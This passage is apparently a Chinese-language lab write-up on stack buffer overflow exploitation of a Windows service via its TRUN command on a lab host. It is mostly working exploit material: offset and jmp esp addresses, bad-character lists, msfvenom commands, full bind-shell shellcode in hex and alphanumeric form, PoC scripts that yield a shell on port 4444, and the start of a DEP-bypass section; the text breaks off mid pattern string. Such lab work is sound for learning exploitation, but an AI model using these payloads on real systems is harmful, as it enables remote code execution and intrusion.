<p>分析此 EIP，可以确定缓存中输入的数据应该是 16 进制方式。但是发现此时 ESP 指向 的内容已经不是 AAAA 字符串了，因此尝试输入 3000 个 A，看看后面是否 A 会往 ESP 方向的 高地址溢出；实践发现是可以的，并且往后溢出的 AAAA 的个数为（1D8=472）个</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241214005505877.png" alt="image-20241214005505877"></p>
<h3 id="定位偏移寻找jmp-esp"><a class="markdownIt-Anchor" href="#定位偏移寻找jmp-esp">#</a> 定位偏移，寻找 jmp esp</h3>
<p>由于是 16 进制方式，所以如果采用唯一字符串方式无法定位，因此采用之前的二分法 来定位。不断尝试 poc 字符串的内容，最后当 poc 如下时，溢出精准定位 EIP=BBBBBBBB</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc =  <span class="string">b"\x41"</span>*<span class="number">2041</span>  </span><br><span class="line">poc += <span class="string">b"\x42"</span>*<span class="number">8</span>  </span><br><span class="line">poc += <span class="string">b"\x43"</span>* (<span class="number">3000</span>-<span class="built_in">len</span>(poc))</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241214151325872.png" alt="image-20241214151325872"></p>
<p>运行  <code>!mona jmp -r esp</code>  指令查找跳转指令，根据找到的结果，使用其中一条结果 <code>625011af</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241214010346849.png" alt="image-20241214010346849"></p>
<p>再修改 poc</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc =  <span class="string">b"\x41"</span>*<span class="number">2041</span>  </span><br><span class="line">poc += <span class="string">b"\xAF\x11\x50\x62"</span>  <span class="comment">#小端序</span></span><br><span class="line">poc += <span class="string">b"\x43"</span>* (<span class="number">3000</span>-<span class="built_in">len</span>(poc)) </span><br></pre></td></tr></tbody></table></figure>
<p>程序精准溢出， <code>EIP=625011AF</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241215150609952.png" alt="image-20241215150609952"></p>
<h3 id="坏字节分析-3"><a class="markdownIt-Anchor" href="#坏字节分析-3">#</a> 坏字节分析</h3>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">badchar =  <span class="string">b"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20"</span>  </span><br><span class="line">badchar += <span class="string">b"2122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f40"</span>  </span><br><span class="line">badchar += <span class="string">b"4142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f60"</span>  </span><br><span class="line">badchar += <span class="string">b"6162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f80"</span>  </span><br><span class="line">badchar += <span class="string">b"8182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0"</span>  </span><br><span class="line">badchar += <span class="string">b"a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0"</span>  </span><br><span class="line">badchar += <span class="string">b"c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0"</span>  </span><br><span class="line">badchar += <span class="string">b"e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff"</span></span><br></pre></td></tr></tbody></table></figure>
<p>修改 poc 如上，查看此时栈中内容，发现坏字节只有 <code>\x00</code></p>
<h3 id="编写shellcode-5"><a class="markdownIt-Anchor" href="#编写shellcode-5">#</a> 编写 shellcode</h3>
<p>kali 运行如下命令生成 shellcode</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f hex</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ba31a9fa72dbc2d97424f45f33c9b15383c70431570e0366a71887745f5e6884a03fe061917f96e2824fdca62e3bb052a4491d550de77b588e54bffb0ca7ecdb2d68e11a6995084e22d1bf7e47af03f51b2104eaec4025bd671be53cab17ac26a81266dd1ae879375311d5765be027bf5c1b52c99ea6650edc7ce39446f6537076db02f37490415b992785d0a5ac28362cf60e9274ac2f83d0034fd3bafcf59857e887c33fdda5fbbf49bd888dd61506be9fb3d1c1b5044d3c367544fb6225fe2a0baefed3de5bf672b179fbc5613e53ae6bb18cce931ba5676ea4d82be742b0c3a1dd2c2696d5cb59fc4d7b11164984a23cfd12295339032e7e6954b9f4f8175b08d1cff89bbe0f76806858df76610ccd21db320cb724f6cb04aaf79e3188e766b9945337ec420df14625e7ab35ef6f2d7630e93253c615820a9f2a2bdb1753517bd78ed19b3a1a2c34e3cf8d59143ad16797ceaa9387bbafd80f50c271fa5671712f</span><br></pre></td></tr></tbody></table></figure>
<p>再修改对应 poc，运行发现靶机 <code>netstat -a</code>  查看端口开放情况， 看到 4444 端口成功开放，kali nc 连接成功 getshell</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212214100832-1734246733799-4.png" alt="image-20241212214100832"></p>
<h3 id="unicode编码"><a class="markdownIt-Anchor" href="#unicode编码">#</a> Unicode 编码</h3>
<p>前面的步骤都一样到 <code>!monafindmsp</code>  找到 offset=2003</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241215152503658.png" alt="image-20241215152503658"></p>
<p>坏字节分析时能看到一直到 7F，后面应该是 80 但是是 01</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241215150332834-1734246277276-1.png" alt="image-20241215150332834"></p>
<p>说明缓冲中只能接受小于等于 \x7f 的内容， 即只能接受 ASCII 的数据。因此这里需要有两个变化：</p>
<p>jmp esp 指令的地址需要是 \x00-\x7f 之间的数据构成   <code>!mona jmp -r esp -cp ascii</code></p>
<p>找到 <code>62501203</code>  这个符合要求的地址（全部小于 7F）</p>
<p>shellcode 代码也只能由 \x00-\x7f 之间的数据构成</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp -e x86/alpha_mixed -b "\x00" BufferRegister=ESP -f python </span><br></pre></td></tr></tbody></table></figure>
<p>（BufferRegister=ESP 用来告诉编码器 shellcode 的位置保存在哪个寄存器中，用于编码器在内存中找到 shellcode 的位置，对编码后的 shellcode 进行解码   <code>Msfvenom -l encoders</code>  显示所有的编码方式）</p>
<p>再根据生成的 buf 修改 poc</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"</span></span><br><span class="line">buf += <span class="string">b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"</span></span><br><span class="line">buf += <span class="string">b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"</span></span><br><span class="line">buf += <span class="string">b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"</span></span><br><span class="line">buf += <span class="string">b"\x42\x75\x4a\x49\x69\x6c\x6a\x48\x4b\x32\x47\x70"</span></span><br><span class="line">buf += <span class="string">b"\x73\x30\x75\x50\x35\x30\x6d\x59\x7a\x45\x75\x61"</span></span><br><span class="line">buf += <span class="string">b"\x39\x50\x32\x44\x6e\x6b\x56\x30\x64\x70\x6c\x4b"</span></span><br><span class="line">buf += <span class="string">b"\x50\x52\x44\x4c\x6e\x6b\x76\x32\x42\x34\x6e\x6b"</span></span><br><span class="line">buf += <span class="string">b"\x62\x52\x51\x38\x76\x6f\x4d\x67\x30\x4a\x47\x56"</span></span><br><span class="line">buf += <span class="string">b"\x54\x71\x39\x6f\x4e\x4c\x67\x4c\x71\x71\x63\x4c"</span></span><br><span class="line">buf += <span class="string">b"\x37\x72\x36\x4c\x55\x70\x4b\x71\x4a\x6f\x64\x4d"</span></span><br><span class="line">buf += <span class="string">b"\x33\x31\x68\x47\x4a\x42\x78\x72\x76\x32\x63\x67"</span></span><br><span class="line">buf += <span class="string">b"\x6e\x6b\x30\x52\x56\x70\x4c\x4b\x31\x5a\x75\x6c"</span></span><br><span class="line">buf += <span class="string">b"\x6c\x4b\x32\x6c\x47\x61\x44\x38\x69\x73\x32\x68"</span></span><br><span class="line">buf += <span class="string">b"\x67\x71\x7a\x71\x46\x31\x4c\x4b\x46\x39\x45\x70"</span></span><br><span class="line">buf += <span class="string">b"\x47\x71\x78\x53\x4c\x4b\x72\x69\x44\x58\x4d\x33"</span></span><br><span class="line">buf += <span class="string">b"\x46\x5a\x50\x49\x4c\x4b\x30\x34\x4c\x4b\x45\x51"</span></span><br><span class="line">buf += <span class="string">b"\x6a\x76\x70\x31\x59\x6f\x4e\x4c\x7a\x61\x4a\x6f"</span></span><br><span class="line">buf += <span class="string">b"\x64\x4d\x67\x71\x39\x57\x45\x68\x6b\x50\x73\x45"</span></span><br><span class="line">buf += <span class="string">b"\x39\x66\x67\x73\x53\x4d\x79\x68\x67\x4b\x53\x4d"</span></span><br><span class="line">buf += <span class="string">b"\x36\x44\x64\x35\x59\x74\x53\x68\x6e\x6b\x73\x68"</span></span><br><span class="line">buf += <span class="string">b"\x45\x74\x67\x71\x38\x53\x65\x36\x4c\x4b\x76\x6c"</span></span><br><span class="line">buf += <span class="string">b"\x42\x6b\x4e\x6b\x43\x68\x67\x6c\x53\x31\x39\x43"</span></span><br><span class="line">buf += <span class="string">b"\x6c\x4b\x65\x54\x6c\x4b\x33\x31\x38\x50\x4e\x69"</span></span><br><span class="line">buf += <span class="string">b"\x53\x74\x74\x64\x34\x64\x73\x6b\x53\x6b\x43\x51"</span></span><br><span class="line">buf += <span class="string">b"\x36\x39\x50\x5a\x66\x31\x69\x6f\x79\x70\x43\x6f"</span></span><br><span class="line">buf += <span class="string">b"\x61\x4f\x71\x4a\x4e\x6b\x66\x72\x48\x6b\x4e\x6d"</span></span><br><span class="line">buf += <span class="string">b"\x71\x4d\x43\x58\x35\x63\x77\x42\x73\x30\x47\x70"</span></span><br><span class="line">buf += <span class="string">b"\x45\x38\x54\x37\x62\x53\x54\x72\x33\x6f\x52\x74"</span></span><br><span class="line">buf += <span class="string">b"\x65\x38\x32\x6c\x71\x67\x47\x56\x36\x67\x49\x6f"</span></span><br><span class="line">buf += <span class="string">b"\x38\x55\x4c\x78\x6e\x70\x33\x31\x67\x70\x53\x30"</span></span><br><span class="line">buf += <span class="string">b"\x45\x79\x6f\x34\x46\x34\x36\x30\x52\x48\x77\x59"</span></span><br><span class="line">buf += <span class="string">b"\x6d\x50\x30\x6b\x33\x30\x4b\x4f\x59\x45\x32\x4a"</span></span><br><span class="line">buf += <span class="string">b"\x64\x48\x36\x39\x42\x70\x78\x62\x49\x6d\x53\x70"</span></span><br><span class="line">buf += <span class="string">b"\x42\x70\x67\x30\x72\x70\x50\x68\x69\x7a\x76\x6f"</span></span><br><span class="line">buf += <span class="string">b"\x69\x4f\x59\x70\x49\x6f\x58\x55\x6d\x47\x45\x38"</span></span><br><span class="line">buf += <span class="string">b"\x74\x42\x63\x30\x56\x71\x31\x4c\x6f\x79\x6a\x46"</span></span><br><span class="line">buf += <span class="string">b"\x70\x6a\x62\x30\x56\x36\x62\x77\x72\x48\x6a\x62"</span></span><br><span class="line">buf += <span class="string">b"\x69\x4b\x37\x47\x33\x57\x39\x6f\x68\x55\x33\x67"</span></span><br><span class="line">buf += <span class="string">b"\x53\x58\x4c\x77\x4a\x49\x37\x48\x4b\x4f\x49\x6f"</span></span><br><span class="line">buf += <span class="string">b"\x38\x55\x52\x77\x32\x48\x51\x64\x68\x6c\x55\x6b"</span></span><br><span class="line">buf += <span class="string">b"\x59\x71\x49\x6f\x4b\x65\x51\x47\x6c\x57\x45\x38"</span></span><br><span class="line">buf += <span class="string">b"\x30\x75\x72\x4e\x32\x6d\x75\x31\x59\x6f\x79\x45"</span></span><br><span class="line">buf += <span class="string">b"\x62\x48\x43\x53\x52\x4d\x53\x54\x63\x30\x4f\x79"</span></span><br><span class="line">buf += <span class="string">b"\x6a\x43\x61\x47\x66\x37\x73\x67\x30\x31\x59\x66"</span></span><br><span class="line">buf += <span class="string">b"\x73\x5a\x65\x42\x30\x59\x72\x76\x39\x72\x4b\x4d"</span></span><br><span class="line">buf += <span class="string">b"\x71\x76\x58\x47\x53\x74\x64\x64\x37\x4c\x75\x51"</span></span><br><span class="line">buf += <span class="string">b"\x53\x31\x6e\x6d\x70\x44\x45\x74\x46\x70\x6b\x76"</span></span><br><span class="line">buf += <span class="string">b"\x73\x30\x53\x74\x72\x74\x46\x30\x50\x56\x51\x46"</span></span><br><span class="line">buf += <span class="string">b"\x66\x36\x51\x56\x76\x36\x62\x6e\x56\x36\x61\x46"</span></span><br><span class="line">buf += <span class="string">b"\x31\x43\x76\x36\x35\x38\x30\x79\x68\x4c\x45\x6f"</span></span><br><span class="line">buf += <span class="string">b"\x6f\x76\x79\x6f\x6b\x65\x6b\x39\x49\x70\x70\x4e"</span></span><br><span class="line">buf += <span class="string">b"\x56\x36\x37\x36\x39\x6f\x64\x70\x72\x48\x66\x68"</span></span><br><span class="line">buf += <span class="string">b"\x6f\x77\x65\x4d\x33\x50\x6b\x4f\x48\x55\x6d\x6b"</span></span><br><span class="line">buf += <span class="string">b"\x4c\x30\x4e\x55\x4f\x52\x71\x46\x70\x68\x6d\x76"</span></span><br><span class="line">buf += <span class="string">b"\x7a\x35\x4f\x4d\x6d\x4d\x39\x6f\x6a\x75\x75\x6c"</span></span><br><span class="line">buf += <span class="string">b"\x63\x36\x61\x6c\x64\x4a\x4d\x50\x69\x6b\x39\x70"</span></span><br><span class="line">buf += <span class="string">b"\x64\x35\x36\x65\x6d\x6b\x33\x77\x46\x73\x64\x32"</span></span><br><span class="line">buf += <span class="string">b"\x52\x4f\x32\x4a\x43\x30\x30\x53\x49\x6f\x79\x45"</span></span><br><span class="line">buf += <span class="string">b"\x41\x41"</span></span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc =<span class="string">b"A"</span>*<span class="number">2003</span> + jmpesp + buf + <span class="string">b"C"</span>*(<span class="number">3000</span>-<span class="number">2003</span>-<span class="number">4</span> - <span class="built_in">len</span>(buf))</span><br></pre></td></tr></tbody></table></figure>
<p>运行 poc，发现 4444 端口开放，nc 连接成功 getshell</p>
<h2 id="rop-绕过数据执行保护bypass-dep"><a class="markdownIt-Anchor" href="#rop-绕过数据执行保护bypass-dep">#</a> ROP 绕过数据执行保护 (Bypass DEP)</h2>
<h3 id="触发漏洞-4"><a class="markdownIt-Anchor" href="#触发漏洞-4">#</a> 触发漏洞</h3>
<p>kali 编写 poc 脚本如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">buffer = <span class="string">b"A"</span> * <span class="number">5000</span>  </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((<span class="string">'192.168.177.135'</span>,<span class="number">9999</span>))  </span><br><span class="line">s.send(<span class="string">b'TRUN .:/ '</span> + buffer + <span class="string">b'\r\n'</span>)  </span><br><span class="line">s.recv(<span class="number">1024</span>)  </span><br><span class="line">s.send(<span class="string">b'EXIT\r\n'</span>)  </span><br><span class="line">s.close()</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241219153730324.png" alt="image-20241219153730324"></p>
<p>靶机 <code>ip=192.168.177.135</code></p>
<p>靶机开启服务，攻击机运行 poc 脚本，程序触发异常报错如下</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241219154132352.png" alt="image-20241219154132352"></p>
<p>可以看到此时的 <code>EIP=41414141</code></p>
<h3 id="定位偏移-2"><a class="markdownIt-Anchor" href="#定位偏移-2">#</a> 定位偏移</h3>
<p>使用如下命令生成唯一字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 5000</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7E